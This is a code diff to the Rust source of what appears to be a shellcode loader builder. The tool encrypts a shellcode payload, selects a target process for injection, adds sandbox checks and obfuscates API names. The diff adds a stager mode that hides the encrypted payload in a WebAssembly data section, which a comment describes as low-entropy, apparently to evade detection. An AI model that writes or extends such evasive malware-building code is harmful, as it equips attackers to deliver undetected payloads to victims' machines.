@@ -4,12 +4,12 @@
 //! Each function here is responsible for one category of replacement
 //! (encryption output, target process, sandbox, API obfuscation).
 
-use crate::config::{Encryption, Order};
+use crate::config::{Encryption, Execution, Order};
 use crate::obfuscation::{non_zero_random_key, obfuscate_api_name, obfuscate_string_for_template};
 use crate::sandbox::build_sandbox;
 use anyhow::{Context, Result};
 use std::collections::HashMap;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
 const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
@@ -35,14 +35,14 @@ pub fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
 fn build_encrypted_output(
     order: &Order,
     src_dir: &Path,
-) -> Result<(crate::encryption::EncryptionOutput, String)> {
+) -> Result<(crate::encryption::EncryptionOutput, String, PathBuf)> {
     let filename = get_encrypted_filename(&order.encryption);
     let path = src_dir.join(filename);
     let include_path = format!("\"{}\"", filename);
     let output =
         crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption)
             .context("Failed to encrypt shellcode")?;
-    Ok((output, include_path))
+    Ok((output, include_path, path))
 }
 
 fn build_basic_replacements(
@@ -115,7 +115,7 @@ pub(super) fn build_replacements(
     order: &Order,
     src_dir: &Path,
 ) -> Result<HashMap<&'static str, String>> {
-    let (enc_output, include_path) = build_encrypted_output(order, src_dir)?;
+    let (enc_output, include_path, enc_path) = build_encrypted_output(order, src_dir)?;
     let mut replacements = build_basic_replacements(enc_output, include_path);
     add_target_process_replacement(&mut replacements, &order.target_process);
 
@@ -125,6 +125,17 @@ pub(super) fn build_replacements(
     } else {
         replacements.insert("{{SANDBOX}}", String::new());
         replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
+    }
+
+    // The ntWat template wraps the encrypted payload in a WebAssembly module:
+    // the encrypted bytes become a wasm data section (generated from a WAT
+    // text source, low-entropy), and the loader reads that section back out
+    // at runtime before decrypting. Only this template uses {{PATH_TO_WASM}}.
+    if matches!(order.execution, Execution::NtWatStager) {
+        let wasm_path = src_dir.join("input.wasm");
+        crate::wat::build_wasm_payload(&enc_path, &wasm_path)
+            .context("Failed to build WebAssembly payload for ntWat template")?;
+        replacements.insert("{{PATH_TO_WASM}}", r#""input.wasm""#.to_string());
     }
 
     add_api_obfuscation_replacements(&mut replacements);
